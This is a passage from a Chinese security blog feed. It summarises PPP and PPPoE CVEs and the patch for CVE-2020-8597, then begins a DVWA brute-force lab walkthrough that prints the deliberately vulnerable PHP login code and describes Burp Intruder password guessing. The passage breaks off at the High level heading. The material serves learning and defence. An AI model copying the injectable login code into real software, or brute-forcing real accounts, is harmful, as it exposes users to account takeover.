href="https://www.cve.org/CVERecord?id=CVE-2023-20819">1. CVE-2023-20819</a></h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在 CDMA PPP 协议中，由于缺少边界检查，可能存在越界写入。这可能导致远程权限升级，而无需额外的执行权限。利用不需要用户交互。</p><blockquote><p>CDMA PPP 是指在 <strong>CDMA（码分多址）蜂窝移动通信网络</strong> 中，使用 <strong>PPP（Point-to-Point Protocol）协议</strong> 进行数据连接的技术方式，主要用于 <strong>早期 2.5G / 3G 移动数据服务</strong> 中，如 <strong>CDMA2000 1x</strong> 或 <strong>EVDO</strong> 网络。</p></blockquote><h3 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787: Out-of-bounds Write</a></p><h4 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h4><p>越界写入，产品在预期缓冲区的末尾或开始之前写入数据。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/CWE-787-Diagram.png" alt="Diagram for CWE-787"></p><h2 id="2-CVE-2022-30133"><a href="#2-CVE-2022-30133" class="headerlink" title="2. CVE-2022-30133"></a><a href="https://www.cve.org/CVERecord?id=CVE-2022-30133">2. CVE-2022-30133</a></h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>Windows 点对点协议（PPP）远程代码执行漏洞。</p><h3 id="漏洞类型：-1"><a href="#漏洞类型：-1" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p>无</p><h2 id="3-CVE-2020-8597"><a href="#3-CVE-2020-8597" class="headerlink" title="3. CVE-2020-8597"></a><a href="https://www.cve.org/CVERecord?id=CVE-2020-8597">3. CVE-2020-8597</a></h2><h3 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在PPP 2.4.2 到 2.4.8 的 PPPD 中，EAP.c 在 eap_request 和 eap_response 函数中存在 RSuneName 缓冲区溢出。</p><blockquote><div class="table-container"><table><thead><tr><th>术语</th><th>含义</th></tr></thead><tbody><tr><td><code>EAP.c</code></td><td>实现 EAP 协议逻辑的源代码文件，通常用于处理认证请求与响应。</td></tr><tr><td><code>eap_request</code></td><td>处理来自服务器的 EAP 请求，如 EAP-Identity、EAP-MD5 等。</td></tr><tr><td><code>eap_response</code></td><td>构造并发送客户端的 EAP 响应消息，作为认证流程的一部分。</td></tr><tr><td><code>RSuneName</code></td><td><strong>字符数组（缓冲区）变量名</strong>，用来存储用户名或标识符。</td></tr></tbody></table></div></blockquote><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p><a href="http://tenable.com/cve/CVE-2020-8597?_gl=1*bgcim4*_gcl_au*MTEyNjg0MjUzNi4xNzQ2NTE4MDc5LjE2OTYwMDg0MjEuMTc0NjUyNjk3OS4xNzQ2NTI2OTc4*_ga*NDM1MTM4MzAuMTc0NjUxODA3OQ..*_ga_HSJ1XWV6ND*czE3NDY1MjY1MjUkbzIkZzEkdDE3NDY1MjcwMTQkajQwJGwxJGgxMzAxODUyMTU4">CVE-2020-8597</a> 是 pppd 中的一个缓冲区溢出漏洞，是由于<a href="https://tools.ietf.org/html/rfc2284">可扩展身份验证协议 </a>（EAP） 的数据包处理器中存在逻辑缺陷所致。未经身份验证的远程攻击者将特制的 EAP 数据包发送到易受攻击的 PPP 客户端或服务器，可造成拒绝服务情况或获得任意代码执行。由于 pppd 与内核驱动程序一起工作，并且通常以高权限（如 system 甚至 root）运行，因此任何代码执行也可以以这些相同的权限运行。</p><p>根据 CERT/CC 的漏洞说明，该逻辑缺陷存在于多个 EAP 函数中。</p><p>在 eap_request 和 eap_response 函数中，使用第一个字节作为类型接收指针和长度作为输入。如果此类型是 EAPT_MD5CHAP（4），则它查看嵌入的 1 字节长度字段。实施此检查是为了确保嵌入长度小于整个数据包长度的长度。如果检查成功通过，则位于嵌入长度之后的主机名将复制到本地堆栈缓冲区中。漏洞在于这些函数如何解析代码的逻辑。如果边界检查不正确并继续复制具有任意长度数据的内存，则可能会出现堆栈缓冲区溢出。</p><p>eap_input 函数在其代码中包含另一个缺陷，该缺陷无法验证 EAP 是否是在 PPP 中的链路控制协议 （LCP） 阶段协商的。从本质上讲，无论验证失败是由于 LCP 阶段的预共享密码不正确还是由于缺乏对 EAP 的支持，未经身份验证的攻击者都可以发送将被处理的 EAP 数据包。处理此未经验证的 EAP 数据包可能会导致堆栈缓冲区溢出。</p><h3 id="补丁："><a href="#补丁：" class="headerlink" title="补丁："></a>补丁：</h3><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250506232224602.png" alt="image-20250506232224602"></p><p>假设：</p><ul><li><code>len</code> 是总缓冲区大小</li><li><code>vallen</code> 是已使用的缓冲区大小</li><li><code>sizeof(rhostname)</code> 是要添加的内容大小 </li></ul><p>因为<code>vallen</code>值小于<code>len</code>。所以第一句<code>if (vallen &gt;= len + sizeof(rhostname))</code>的情况永远不会发生，如果后续代码继续执行<code>rhostname</code>的写入，而没有检查内存剩余空间，这就有可能会导致发生内存溢出。</p><p>而改成第二句<code>if (len - vallen &gt;= sizeof(rhostname))</code>后，直接计算剩余空间是否足够，只有当剩余空间&gt;=所需空间时，才允许写入，就能阻止<code>rhostname</code>溢出。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPPoE协议的漏洞分析</title>
      <link href="/2025/05/06/PPPoE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/06/PPPoE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="PPPoE协议漏洞分析"><a href="#PPPoE协议漏洞分析" class="headerlink" title="PPPoE协议漏洞分析"></a>PPPoE协议漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>PPPoE</strong>  的全称是 <strong>Point-to-Point Protocol over Ethernet（以太网上的点对点协议）</strong> ，它是一种在 <strong>以太网（比如家庭局域网）上建立拨号连接</strong>  的协议，主要用于 <strong>宽带上网连接（特别是 ADSL）</strong> 。<strong>PPPoE</strong>也叫宽带拨号上网，拨号宽带接入是当前最广泛的宽带接入方式，运营商分配宽带用户名和密码，通过用户名和密码进行用户身份认证。如果电脑与宽带直接连接，需要在电脑上进行宽带<strong>PPPoE</strong>拨号才可以上网。简而言之，<strong>PPPoE</strong>拨号是使用宽带账号、密码进行拨号的上网方式。</p><hr><h3 id="🔧-简单理解："><a href="#🔧-简单理解：" class="headerlink" title="🔧 简单理解："></a>🔧 简单理解：</h3><blockquote><p>PPPoE 就是你用 <strong>用户名+密码拨号上网</strong>  的方式，在以太网中实现互联网连接的技术。</p></blockquote><hr><h3 id="🧱-结构说明："><a href="#🧱-结构说明：" class="headerlink" title="🧱 结构说明："></a>🧱 结构说明：</h3><p>PPPoE 是把 <strong>PPP 协议（原本用于电话线拨号）</strong>  封装在 <strong>以太网帧</strong>  中，让传统拨号方式可以应用在现代以太网中。</p><h4 id="它结合了两个协议的优点："><a href="#它结合了两个协议的优点：" class="headerlink" title="它结合了两个协议的优点："></a>它结合了两个协议的优点：</h4><ul><li><p>📞 <strong>PPP</strong> ：支持认证（如 PAP/CHAP）、压缩、加密等</p></li><li><p>🌐 <strong>Ethernet</strong> ：局域网广泛使用的网络协议</p></li></ul><hr><h3 id="📦-工作流程："><a href="#📦-工作流程：" class="headerlink" title="📦 工作流程："></a>📦 工作流程：</h3><ol><li><strong>发现阶段（Discovery）</strong> </li></ol><p>客户端广播寻找 PPPoE 服务器（PPPoE Access Concentrator）</p><ol><li><strong>会话阶段（Session）</strong> </li></ol><p>成功建立后，客户端输入用户名密码（PAP 或 CHAP）完成认证，开始传输数据</p><hr><h3 id="🌍-应用场景："><a href="#🌍-应用场景：" class="headerlink" title="🌍 应用场景："></a>🌍 应用场景：</h3><div class="table-container"><table><thead><tr><th>应用场景</th><th>说明</th></tr></thead><tbody><tr><td>家庭宽带（尤其是 ADSL）</td><td>早期用户必须“拨号上网”，这就是 PPPoE</td></tr><tr><td>路由器中的“宽带拨号”</td><td>路由器用 PPPoE 模式连接 ISP，需填写账号密码</td></tr><tr><td>企业防火墙 / 接入网关</td><td>控制用户身份、限速、限带宽</td></tr></tbody></table></div><hr><h3 id="💬-举个例子："><a href="#💬-举个例子：" class="headerlink" title="💬 举个例子："></a>💬 举个例子：</h3><p>如果你家以前用过拨号上网（比如中国电信），在电脑或路由器里填过类似这种信息：</p><ul><li><p>用户名：<code>123456@telecom</code></p></li><li><p>密码：<code>abc123</code></p></li></ul><p>那么你就是在用 <strong>PPPoE 拨号上网</strong> 。</p><hr><h2 id="1-CVE-2024-20327"><a href="#1-CVE-2024-20327" class="headerlink" title="1. CVE-2024-20327"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-20327">1. CVE-2024-20327</a></h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h3><p>用于 Cisco ASR 9000 系列聚合服务路由器的 Cisco IOS XR 软件的以太网 PPP 终止 （PPPoE） 终止功能中存在一个漏洞，该漏洞可能允许未经身份验证的相邻攻击者使 ppp_ma 进程崩溃，从而导致拒绝服务 （DoS） 情况。此漏洞是由于在基于 Lightspeed 或基于 Lightspeed-Plus 的线卡上运行宽带网络网关 （BNG） 功能和 PPPoE 终端的路由器上接收的格式错误的 PPPoE 数据包处理不当造成的。攻击者可以通过将构建的 PPPoE 数据包发送到不终止 PPPoE 的受影响线卡接口来利用此漏洞。成功利用此漏洞可允许攻击者使 ppp_ma 进程崩溃，从而导致路由器上的 PPPoE 通信出现 DoS 条件。</p><h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型:"></a>漏洞类型:</h3><p><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></p><p><a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxr-pppma-JKWFgneW">Cisco官方通报</a></p><h4 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h4><p>不正确的输入验证，产品接受输入或数据，但它不会验证或错误地验证输入是否具有安全正确地处理数据所需的属性。</p><p><img src="https://cwe.mitre.org/data/images/CWE-20-Diagram.png" alt="Diagram for CWE-20"></p><h2 id="2-CVE-2023-28224"><a href="#2-CVE-2023-28224" class="headerlink" title="2. CVE-2023-28224"></a><a href="https://www.cve.org/CVERecord?id=CVE-2023-28224">2. CVE-2023-28224</a></h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>Windows以太网点对点协议（PPPoE）远程代码执行漏洞。</p><h3 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/591.html">CWE-591: Sensitive Data Storage in Improperly Locked Memory</a></p><h4 id="描述：-1"><a href="#描述：-1" class="headerlink" title="描述："></a>描述：</h4><p>敏感数据存储在未正确锁定的内存中，该产品将敏感数据存储在未锁定或已错误锁定的内存中，这可能会导致虚拟内存管理器将内存写入磁盘上的交换文件。这可以使外部参与者更容易访问数据。</p><p>在Windows系统上，VirtualLock函数可以锁定内存页，以确保它保留在内存中并且不会交换到磁盘。但是，在旧版本的Windows（如95、98或Me）上，VirtualLock（）函数只是一个存根，不提供任何保护。在POSIX系统上，mlock（）调用可确保页面驻留在内存中，但不能保证该页面不会出现在交换中。因此，它不适用作敏感数据的保护机制。某些平台（尤其是Linux）确实保证页面不会被交换，但这是非标准的，不可移植。对mlock（）的调用也需要supervisor权限。必须检查这两个调用的返回值，以确保锁定操作实际成功。</p><blockquote><p><code>VirtualLock</code> 函数是 Windows API 中的一个内存管理函数，其作用是<strong>将指定的虚拟内存页锁定在物理内存中，防止其被分页到磁盘（即防止换出到页面文件）</strong>。</p><hr><h2 id="✅-函数原型（C-C-）"><a href="#✅-函数原型（C-C-）" class="headerlink" title="✅ 函数原型（C/C++）"></a>✅ 函数原型（C/C++）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;BOOL <span class="title function_">VirtualLock</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,  <span class="comment">// 起始地址</span></span></span><br><span class="line"><span class="params">SIZE_T dwSize      <span class="comment">// 要锁定的内存区域大小（以字节为单位）</span></span></span><br><span class="line"><span class="params">&gt;)</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="🔍-功能详解"><a href="#🔍-功能详解" class="headerlink" title="🔍 功能详解"></a>🔍 功能详解</h2><ul><li><p>Windows 操作系统使用<strong>虚拟内存管理机制</strong>，程序使用的内存页可能在不活跃时被操作系统换出到磁盘（分页文件）。</p></li><li><p><code>VirtualLock</code> 可以<strong>强制将特定内存页保留在物理内存中</strong>，确保这些数据在访问时不会因分页而导致性能下降或数据泄露风险。</p></li></ul></blockquote><h2 id="3-CVE-2023-23385"><a href="#3-CVE-2023-23385" class="headerlink" title="3. CVE-2023-23385"></a><a href="https://www.cve.org/CVERecord?id=CVE-2023-23385">3. CVE-2023-23385</a></h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>Windows 以太网点对点协议 （PPPoE） 特权提升漏洞。</p><h3 id="漏洞类型：-1"><a href="#漏洞类型：-1" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190: Integer Overflow or Wraparound</a></p><h4 id="描述：-2"><a href="#描述：-2" class="headerlink" title="描述："></a>描述：</h4><p>整数溢出或环绕，当logic假定结果值始终大于原始值时，product执行的计算可能会产生整数溢出或环绕。当整数值递增到太大而无法存储在关联表示中的值时，会发生这种情况。发生这种情况时，该值可能会变成一个非常小的数字或负数。</p><p><img src="https://cwe.mitre.org/data/images/CWE-190-Diagram.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习之旅之Brute Force</title>
      <link href="/2025/04/11/%E9%9D%B6%E5%9C%BA%E4%B9%8B%E6%97%85/"/>
      <url>/2025/04/11/%E9%9D%B6%E5%9C%BA%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA学习之旅之Brute-Force"><a href="#DVWA学习之旅之Brute-Force" class="headerlink" title="DVWA学习之旅之Brute Force"></a>DVWA学习之旅之Brute Force</h1><p>    Author: hxd    <br>Date: 2025年4月11日</p><h2 id="DVWA的简介"><a href="#DVWA的简介" class="headerlink" title="DVWA的简介"></a>DVWA的简介</h2><p>DVWA(Damn Vulnerable Web Application)一个用来进行安全脆弱性鉴定的PHP/MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA 一共包含了十个攻击模块，分别是：<strong>Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）</strong>。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。</p><p>另外，DVWA 还可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。</p><p>一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；</p><p>最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段。</p><p>下载和搭建过程我就省略了，网上都有，下面让我们直接开始：</p><h2 id="Burp-Force-（暴力破解）"><a href="#Burp-Force-（暴力破解）" class="headerlink" title="Burp Force （暴力破解）"></a>Burp Force （暴力破解）</h2><h3 id="Low-Level（开发人员完全忽视了任何保护方法，允许任何人多次任意访问，可以在没有任何影响的情况下对任意用户进行登录）"><a href="#Low-Level（开发人员完全忽视了任何保护方法，允许任何人多次任意访问，可以在没有任何影响的情况下对任意用户进行登录）" class="headerlink" title="Low Level（开发人员完全忽视了任何保护方法，允许任何人多次任意访问，可以在没有任何影响的情况下对任意用户进行登录）"></a>Low Level（开发人员完全忽视了任何保护方法，允许任何人多次任意访问，可以在没有任何影响的情况下对任意用户进行登录）</h3><h4 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码如下，代码将获取用户输入的用户名和密码并将其进行 md5 加密，然后使用 SQL SELECT 语句进行查询。由于进行了 md5 加密，因此直接阻止了 SQL 注入，因为经过 md5 这种摘要算法之后 SQL 语句就会被破坏(不过这里用 SQL 注入可以登陆成功)。注意到此时服务器只是使用了 isset() 函数验证了参数 Login 是否被设置，参数 username、password 没有做任何过滤，更重要的是没有任何的防爆破机制。</p><h4 id="Gesture"><a href="#Gesture" class="headerlink" title="Gesture"></a>Gesture</h4><p>首先打开BP抓包，使用Sniper狙击手模式，只更改password，同时加载Payload，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411171446127.png" alt="image-20250411171446127" style="zoom:50%;"></p><p>爆破如下，发现password长度不一样：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411171528862.png" alt="image-20250411171528862"></p><p>说明Low Level的用户名是admin，密码是password，登陆如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411171659702.png" alt="image-20250411171659702"></p><h3 id="Medium-Level（此阶段在验证失败的登陆屏幕上添加睡眠，这意味着当你登录不正确时，在页面可见之前将有两秒钟的等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长）"><a href="#Medium-Level（此阶段在验证失败的登陆屏幕上添加睡眠，这意味着当你登录不正确时，在页面可见之前将有两秒钟的等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长）" class="headerlink" title="Medium Level（此阶段在验证失败的登陆屏幕上添加睡眠，这意味着当你登录不正确时，在页面可见之前将有两秒钟的等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长）"></a>Medium Level（此阶段在验证失败的登陆屏幕上添加睡眠，这意味着当你登录不正确时，在页面可见之前将有两秒钟的等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长）</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码如下，Medium 级别的代码主要增加了 <strong>mysql_real_escape_string 函数，该函数会对字符串中的特殊符号进行转义，从而对用户输入的参数进行了简单的过滤</strong>。相比 low 级别的代码，当登录验证失败时界面将冻结 2 秒，从而影响了爆破操作的效率，不过如果是一个闲来无事并且很有耐心的白帽黑客，爆破出密码仍然是时间问题。</p><h4 id="Gesture-1"><a href="#Gesture-1" class="headerlink" title="Gesture"></a>Gesture</h4><p>继续使用BP抓包，跟Low Level一样的操作，只是由于登录验证失败时界面会冻结2秒，所以会慢一点：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411173801600.png" alt="image-20250411173801600"></p><p>发现密码还是password:</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411173926027.png" alt="image-20250411173926027"></p><p>成功登录：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411174001014.png" alt="image-20250411174001014"></p><hr><h3 id="High-Level（开发者使用了”CSRF”的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别扩展了中等级别，在登录失败时等待，但这次是-2-到-4-秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与-CSRF-令牌类似的效果。）"><a href="#High-Level（开发者使用了”CSRF”的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别扩展了中等级别，在登录失败时等待，但这次是-2-到-4-秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与-CSRF-令牌类似的效果。）" class="headerlink" title="High 